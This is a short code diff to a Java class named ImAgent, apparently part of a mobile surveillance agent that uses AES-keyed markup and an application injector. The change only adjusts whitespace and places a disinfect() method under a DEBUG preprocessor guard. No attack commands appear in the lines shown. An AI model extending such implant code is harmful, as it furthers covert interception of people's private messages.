@@ -79,7 +79,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         markup = new LineMarkup(agentId, Encryption.getKeys().getAesKey());
 
     }
-
+    
     private synchronized String unserialize(String partecipants) {
         //#ifdef DEBUG
         debug.trace("unserialize");
@@ -314,10 +314,12 @@ public final class ImAgent extends Agent implements BacklightObserver,
 
     }
     
+    //#ifdef DEBUG
     public void disinfect(){
         if(appInjector!=null){
             appInjector.disinfect();
         }
     }
+    //#endif
 
 }
